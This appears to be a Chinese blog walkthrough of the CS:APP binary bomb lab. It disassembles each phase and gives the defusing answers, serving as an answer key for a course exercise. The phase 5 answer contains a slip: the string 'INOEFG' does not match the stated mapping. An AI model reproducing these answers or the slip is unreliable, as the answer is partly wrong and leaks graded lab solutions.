<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400ee4:	be 00 24 40 00       	mov    $0x402400,%esi</span><br><span class="line">  400ee9:	e8 4a 04 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  400eee:	85 c0                	test   %eax,%eax</span><br><span class="line">  400ef0:	74 05                	je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">  400ef2:	e8 43 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400ef7:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  400efb:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>这段函数的功能很直接：将读入的字符串和「密码」比较，如果两个字符串不相同，那么就引爆。比较字符串是否相等，也可以从调用 <code>strings_not_equal</code> 看出来。在汇编中使用了一个神奇的地址<code>mov    $0x402400,%esi</code>，所以我们使用 GDB 查看这个地址中的内容。</p>
<p><img src="/images/2017-4-17/so1/1.PNG" alt="1"></p>
<p>再次运行程序，并且输入密码试试看：</p>
<p><img src="/images/2017-4-17/so1/2.PNG" alt="2"></p>
<p>成功！</p>
<h2 id="关卡-2"><a href="#关卡-2" class="headerlink" title="关卡 2"></a>关卡 2</h2><p><code>phase_2</code>  的汇编代码比前一个稍长：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:	55                   	push   %rbp</span><br><span class="line">  400efd:	53                   	push   %rbx</span><br><span class="line">  400efe:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  400f02:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">  400f05:	e8 52 05 00 00       	callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)</span><br><span class="line">  400f0e:	74 20                	je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f10:	e8 25 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:	eb 19                	jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax</span><br><span class="line">  400f1a:	01 c0                	add    %eax,%eax</span><br><span class="line">  400f1c:	39 03                	cmp    %eax,(%rbx)</span><br><span class="line">  400f1e:	74 05                	je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">  400f20:	e8 15 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:	48 83 c3 04          	add    $0x4,%rbx</span><br><span class="line">  400f29:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  400f2c:	75 e9                	jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:	eb 0c                	jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx</span><br><span class="line">  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp</span><br><span class="line">  400f3a:	eb db                	jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  400f40:	5b                   	pop    %rbx</span><br><span class="line">  400f41:	5d                   	pop    %rbp</span><br><span class="line">  400f42:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>其中 <code>callq  40145c &lt;read_six_numbers&gt;</code> 表明函数要求用户读入六个数字，并存放在栈中。下几行很关键：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)</span><br><span class="line">400f0e:	74 20                	je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">400f10:	e8 25 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>在读取 6 个数字之后，会拿第一个数字和 1 进行比较，如果不相等，那么就引爆炸弹，所以我们可以确定第一个数字一定是 1。</p>
<p>下面几行在一个循环中被执行，意思是从栈中某位置取出一个数，和自身相加，并判断是否和下一个数字相等，也就是相当于判断 <code>s[i] + s[i] == s[i + 1]</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax</span><br><span class="line">400f1a:	01 c0                	add    %eax,%eax</span><br><span class="line">400f1c:	39 03                	cmp    %eax,(%rbx)</span><br><span class="line">400f1e:	74 05                	je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">400f20:	e8 15 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>

<p>现在我们就可以知道这 6 个数字从 1 开始，下一个是前一个的两倍：1， 2， 4， 8， 16， 32。我们输入试试：</p>
<p><img src="/images/2017-4-17/so2/2.PNG" alt="2"></p>
<h2 id="关卡-3"><a href="#关卡-3" class="headerlink" title="关卡 3"></a>关卡 3</h2><p><code>phase_3</code> 的开头表示我们调用了 <code>sscanf</code> 函数解析输入，如果输入参数的个数小于 1则引爆。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  400f56:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400f5b:	e8 90 fc ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:	83 f8 01             	cmp    $0x1,%eax</span><br><span class="line">  400f63:	7f 05                	jg     400f6a &lt;phase_3+0x27&gt;</span><br><span class="line">  400f65:	e8 d0 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>

<p>那么我们应该输入什么呢？注意到解析输入之前，用到了一个地址 <code>0x4025cf</code>，我们查看他的内容：</p>
<p><img src="/images/2017-4-17/so3/1.PNG" alt="1"></p>
<p>所以我们输入的应该是两个整数。</p>
<p>下面两行表示我们输入的第一个数不可以大于 7，否则会跳转到引爆点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)</span><br><span class="line">400f6f:	77 3c                	ja     400fad &lt;phase_3+0x6a&gt;</span><br></pre></td></tr></table></figure>

<p>接下来是一连串的跳转，根据我们输入的第一个值决定跳转位置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax</span><br><span class="line">400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)</span><br><span class="line">400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax</span><br><span class="line">400f81:	eb 3b                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax</span><br><span class="line">400f88:	eb 34                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">400f8a:	b8 00 01 00 00       	mov    $0x100,%eax</span><br><span class="line">400f8f:	eb 2d                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">400f91:	b8 85 01 00 00       	mov    $0x185,%eax</span><br><span class="line">400f96:	eb 26                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">400f98:	b8 ce 00 00 00       	mov    $0xce,%eax</span><br><span class="line">400f9d:	eb 1f                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax</span><br><span class="line">400fa4:	eb 18                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">400fa6:	b8 47 01 00 00       	mov    $0x147,%eax</span><br><span class="line">400fab:	eb 11                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">400fad:	e8 88 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">400fb2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">400fb7:	eb 05                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">400fb9:	b8 37 01 00 00       	mov    $0x137,%eax</span><br><span class="line">400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax</span><br><span class="line">400fc2:	74 05                	je     400fc9 &lt;phase_3+0x86&gt;</span><br></pre></td></tr></table></figure>

<p>这上面这段代码里，根据第一个值决定跳转位置的代码非常明显：<code>jmpq   *0x402470(,%rax,8)</code>。我们可以使用 GDB 在查看跳转表的内容：</p>
<p><img src="/images/2017-4-17/so3/2.PNG" alt="2"></p>
<p>这样我们就得到了跳转表：</p>
<table>
<thead>
<tr>
<th>值</th>
<th>目标值</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>207</td>
</tr>
<tr>
<td>1</td>
<td>311</td>
</tr>
<tr>
<td>2</td>
<td>707</td>
</tr>
<tr>
<td>3</td>
<td>256</td>
</tr>
<tr>
<td>4</td>
<td>389</td>
</tr>
<tr>
<td>5</td>
<td>206</td>
</tr>
<tr>
<td>6</td>
<td>682</td>
</tr>
<tr>
<td>7</td>
<td>327</td>
</tr>
</tbody></table>
<p>也就是所，上表中的任意一对值都可以接触炸弹。</p>
<p><img src="/images/2017-4-17/so3/3.PNG" alt="3"></p>
<h2 id="关卡-4"><a href="#关卡-4" class="headerlink" title="关卡 4"></a>关卡 4</h2><p>关卡 4 开头的套路和关卡 3 一样，首先调用 <code>sscanf</code> 读入值，如果参数个数不为 2，则引爆。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">40100c:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">401010:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">401015:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">40101a:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">40101f:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">401024:	e8 c7 fb ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">401029:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">40102c:	75 07                	jne    401035 &lt;phase_4+0x29&gt;</span><br></pre></td></tr></table></figure>

<p>我们查看在 <code>0x4025cf</code> 保存的输入格式要求：</p>
<p><img src="/images/2017-4-17/so4/1.PNG" alt="1"></p>
<p>可以看到我们需要输入两个整数。</p>
<p>接下来要求第一个参数小于 14，第二个参数是0， 并把14、x、0作为参数传入 <code>fun4</code>，要求 <code>fun4</code> 返回0在经过仔细推导之后，我发现，当答案为 7、0时，可以成功返回 0。</p>
<p><img src="/images/2017-4-17/so4/2.PNG" alt="2"></p>
<h2 id="关卡-5"><a href="#关卡-5" class="headerlink" title="关卡 5"></a>关卡 5</h2><p>关卡 5 要求我们输入一个长度为 6 的字符串，否则就引爆。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0000000000401062 &lt;phase_5&gt;:</span><br><span class="line">  401062:	53                   	push   %rbx</span><br><span class="line">  401063:	48 83 ec 20          	sub    $0x20,%rsp</span><br><span class="line">  401067:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">  40106a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line">  401071:	00 00 </span><br><span class="line">  401073:	48 89 44 24 18       	mov    %rax,0x18(%rsp)</span><br><span class="line">  401078:	31 c0                	xor    %eax,%eax</span><br><span class="line">  40107a:	e8 9c 02 00 00       	callq  40131b &lt;string_length&gt;</span><br><span class="line">  40107f:	83 f8 06             	cmp    $0x6,%eax</span><br><span class="line">  401082:	74 4e                	je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  401084:	e8 b1 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>

<p>接下来代码每次从字符串中取出一个字符，并做变换：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">40108f:	88 0c 24             	mov    %cl,(%rsp)</span><br><span class="line">401092:	48 8b 14 24          	mov    (%rsp),%rdx</span><br><span class="line">401096:	83 e2 0f             	and    $0xf,%edx</span><br><span class="line">401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">4010a4:	48 83 c0 01          	add    $0x1,%rax</span><br><span class="line">4010a8:	48 83 f8 06          	cmp    $0x6,%rax</span><br><span class="line">4010ac:	75 dd                	jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)</span><br></pre></td></tr></table></figure>
<p>可惜我们不知道变换方法是什么，但是代码中有一个突兀的地址，我们打印地址中的内容：</p>
<p><img src="/images/2017-4-17/so5/2.PNG" alt="2"></p>
<p>里面开头是一段奇怪的字符：”maduiersnfotvbyl”</p>
<p>然后，将变换后的字符串和存储在 0x40245e 的字符串作比较，判断是否相当，如果相等，最解除成功。所以我们查看目标字符串：</p>
<p><img src="/images/2017-4-17/so5/1.PNG" alt="1"></p>
<p>在有了目标字符串后，我们现在知道了上述的字符串可以看做是一张查找表，可以得到对应关系：</p>
<p>0123456789abcdef<br>maduiersnfotvbyl</p>
<p>所以，我们要得到 “flyers”，就应该输入“9 f e 5 6 7”，将数字对应到 ASCII 码中的字符，可以得到“INOEFG”。</p>
<p><img src="/images/2017-4-17/so5/4.PNG" alt="4"></p>
<h2 id="关卡-6"><a href="#关卡-6" class="headerlink" title="关卡 6"></a>关卡 6</h2><p>关卡 6 需要仔细分析，我使用了 GDB 单步运行的方法来分析了运行过程。首先，函数要求读入 6 个数，并确认个数是否为 6。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">00000000004010f4 &lt;phase_6&gt;:</span><br><span class="line">  4010f4:	41 56                	push   %r14</span><br><span class="line">  4010f6:	41 55                	push   %r13</span><br><span class="line">  4010f8:	41 54                	push   %r12</span><br><span class="line">  4010fa:	55                   	push   %rbp</span><br><span class="line">  4010fb:	53                   	push   %rbx</span><br><span class="line">  4010fc:	48 83 ec 50          	sub    $0x50,%rsp</span><br><span class="line">  401100:	49 89 e5             	mov    %rsp,%r13</span><br><span class="line">  401103:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">  401106:	e8 51 03 00 00       	callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">  40110b:	49 89 e6             	mov    %rsp,%r14</span><br><span class="line">  40110e:	41 bc 00 00 00 00    	mov    $0x0,%r12d</span><br><span class="line">  401114:	4c 89 ed             	mov    %r13,%rbp</span><br><span class="line">  401117:	41 8b 45 00          	mov    0x0(%r13),%eax</span><br><span class="line">  40111b:	83 e8 01             	sub    $0x1,%eax</span><br><span class="line">  40111e:	83 f8 05             	cmp    $0x5,%eax</span><br><span class="line">  401121:	76 05                	jbe    401128 &lt;phase_6+0x34&gt;</span><br><span class="line">  401123:	e8 12 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>

<p>然后，通过双重循环，判断 6 个数之间不存在重复。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">401138:	8b 04 84             	mov    (%rsp,%rax,4),%eax</span><br><span class="line">40113b:	39 45 00             	cmp    %eax,0x0(%rbp)</span><br><span class="line">40113e:	75 05                	jne    401145 &lt;phase_6+0x51&gt;</span><br><span class="line">401140:	e8 f5 02 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401145:	83 c3 01             	add    $0x1,%ebx</span><br><span class="line">401148:	83 fb 05             	cmp    $0x5,%ebx</span><br><span class="line">40114b:	7e e8                	jle    401135 &lt;phase_6+0x41&gt;</span><br><span class="line">40114d:	49 83 c5 04          	add    $0x4,%r13</span><br><span class="line">401151:	eb c1                	jmp    401114 &lt;phase_6+0x20&gt;</span><br><span class="line">401153:	48 8d 74 24 18       	lea    0x18(%rsp),%rsi</span><br><span class="line">401158:	4c 89 f0             	mov    %r14,%rax</span><br><span class="line">40115b:	b9 07 00 00 00       	mov    $0x7,%ecx</span><br><span class="line">401160:	89 ca                	mov    %ecx,%edx</span><br><span class="line">401162:	2b 10                	sub    (%rax),%edx</span><br><span class="line">401164:	89 10                	mov    %edx,(%rax)</span><br><span class="line">401166:	48 83 c0 04          	add    $0x4,%rax</span><br><span class="line">40116a:	48 39 f0             	cmp    %rsi,%rax</span><br><span class="line">40116d:	75 f1                	jne    401160 &lt;phase_6+0x6c&gt;</span><br><span class="line">40116f:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">401174:	eb 21                	jmp    401197 &lt;phase_6+0xa3&gt;</span><br><span class="line">401176:	48 8b 52 08          	mov    0x8(%rdx),%rdx</span><br><span class="line">40117a:	83 c0 01             	add    $0x1,%eax</span><br><span class="line">40117d:	39 c8                	cmp    %ecx,%eax</span><br><span class="line">40117f:	75 f5                	jne    401176 &lt;phase_6+0x82&gt;</span><br></pre></td></tr></table></figure>
<p>这里有一个要细节，就是这段代码保存了和 7 的差：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">401158:	4c 89 f0             	mov    %r14,%rax</span><br><span class="line">40115b:	b9 07 00 00 00       	mov    $0x7,%ecx</span><br><span class="line">401160:	89 ca                	mov    %ecx,%edx</span><br></pre></td></tr></table></figure>

<p>接下来的代码中，有一个奇怪的地址，我们打印它的内容：</p>
<p><img src="/images/2017-4-17/so6/1.PNG" alt="1"></p>
<p>通过分析这个结构，我们可以看到它是一个链表，定义类似于:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct Node &#123;</span><br><span class="line">	int value;</span><br><span class="line">	int index;</span><br><span class="line">	struct node *next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来，代码要求由大到小获取链表中的值：</p>
<p>所以我们打印链表的节点值：</p>
<p><img src="/images/2017-4-17/so6/2.PNG" alt="2"></p>
<p>从大到小排列他们的索引分别是：3 4 5 6 1 2，考虑被 7 减的操作，所以答案是：4 3 2 1 6 5</p>
<p><img src="/images/2017-4-17/so6/3.PNG" alt="3"></p>
<h2 id="隐藏关卡"><a href="#隐藏关卡" class="headerlink" title="隐藏关卡"></a>隐藏关卡</h2><p>隐藏关卡的入口在 <code>phase_defused</code> 中，所以，我们在函数入口设置断点，研究怎样才能进入<code>secret_phase</code>。<code>phase_defused</code> 的开头统计了我们目前输入了多少个答案，如果不为 6，那么你永远都无法触发隐藏关卡。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00000000004015c4 &lt;phase_defused&gt;:</span><br><span class="line">  4015c4:	48 83 ec 78          	sub    $0x78,%rsp</span><br><span class="line">  4015c8:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line">  4015cf:	00 00 </span><br><span class="line">  4015d1:	48 89 44 24 68       	mov    %rax,0x68(%rsp)</span><br><span class="line">  4015d6:	31 c0                	xor    %eax,%eax</span><br><span class="line">  4015d8:	83 3d 81 21 20 00 06 	cmpl   $0x6,0x202181(%rip)        # 603760 &lt;num_input_strings&gt;</span><br><span class="line">  4015df:	75 5e                	jne    40163f &lt;phase_defused+0x7b&gt;</span><br></pre></td></tr></table></figure>

<p>接下来，我们分析触发 <code>secret_phase</code> 的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">4015e1:	4c 8d 44 24 10       	lea    0x10(%rsp),%r8</span><br><span class="line">4015e6:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">4015eb:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">4015f0:	be 19 26 40 00       	mov    $0x402619,%esi</span><br><span class="line">4015f5:	bf 70 38 60 00       	mov    $0x603870,%edi</span><br><span class="line">4015fa:	e8 f1 f5 ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">4015ff:	83 f8 03             	cmp    $0x3,%eax</span><br><span class="line">401602:	75 31                	jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">401604:	be 22 26 40 00       	mov    $0x402622,%esi</span><br><span class="line">401609:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi</span><br><span class="line">40160e:	e8 25 fd ff ff       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">401613:	85 c0                	test   %eax,%eax</span><br><span class="line">401615:	75 1e                	jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">401617:	bf f8 24 40 00       	mov    $0x4024f8,%edi</span><br><span class="line">40161c:	e8 ef f4 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">401621:	bf 20 25 40 00       	mov    $0x402520,%edi</span><br><span class="line">401626:	e8 e5 f4 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">40162b:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">401630:	e8 0d fc ff ff       	callq  401242 &lt;secret_phase&gt;</span><br></pre></td></tr></table></figure>

<p>首先程序将三个值保存在寄存器，我们查看它们的内容：</p>
<p><img src="/images/2017-4-17/secret/sss.png" alt="sss"></p>
<p>分别是7、4、3。</p>
<p>下面是两个特殊的地址，并且将地址指向的值作为了 <code>sscanf</code> 的参数。我们打印这两个特殊地址的值：</p>
<p><img src="/images/2017-4-17/secret/ss.png" alt="ss"></p>
<p>现在我们可以看到，<code>sscanf</code> 要求的输入格式是两个整数和一个字符串，而其中的两个整数是我们在关卡 4输入的值，那么剩下的字符串应该是什么呢？</p>
<p>我们可以看到，剩余的代码中还有一系列地址，我们打印他们指向的内存中的值：</p>
<p><img src="/images/2017-4-17/secret/s.png" alt="s"></p>
<p>可以看到最后一个就是我们想要的字符串。我们把它加到关卡 4 的答案后面即可进入隐藏关卡。</p>
<p>接下来我们查看隐藏关卡的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0000000000401242 &lt;secret_phase&gt;:</span><br><span class="line">  401242:	53                   	push   %rbx</span><br><span class="line">  401243:	e8 56 02 00 00       	callq  40149e &lt;read_line&gt;</span><br><span class="line">  401248:	ba 0a 00 00 00       	mov    $0xa,%edx</span><br><span class="line">  40124d:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  401252:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">  401255:	e8 76 f9 ff ff       	callq  400bd0 &lt;strtol@plt&gt;</span><br><span class="line">  40125a:	48 89 c3             	mov    %rax,%rbx</span><br><span class="line">  40125d:	8d 40 ff             	lea    -0x1(%rax),%eax</span><br><span class="line">  401260:	3d e8 03 00 00       	cmp    $0x3e8,%eax</span><br><span class="line">  401265:	76 05                	jbe    40126c &lt;secret_phase+0x2a&gt;</span><br><span class="line">  401267:	e8 ce 01 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40126c:	89 de                	mov    %ebx,%esi</span><br><span class="line">  40126e:	bf f0 30 60 00       	mov    $0x6030f0,%edi</span><br><span class="line">  401273:	e8 8c ff ff ff       	callq  401204 &lt;fun7&gt;</span><br><span class="line">  401278:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">  40127b:	74 05                	je     401282 &lt;secret_phase+0x40&gt;</span><br><span class="line">  40127d:	e8 b8 01 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401282:	bf 38 24 40 00       	mov    $0x402438,%edi</span><br><span class="line">  401287:	e8 84 f8 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40128c:	e8 33 03 00 00       	callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  401291:	5b                   	pop    %rbx</span><br><span class="line">  401292:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>代码首先读入一个字符串，然后调用 <code>strtol</code> 将它转换成 10 进制数，并和 0x3e8（也就是 1000）比较，如果大于1000，则引爆；否则，调用 <code>fun7</code>，<code>fun7</code>的参数是一个地址和一个数。如果 <code>fun7</code> 的返回值等于 2，则拆弹成功。</p>
<p>我们看看 <code>fun7</code> 做了什么。</p>
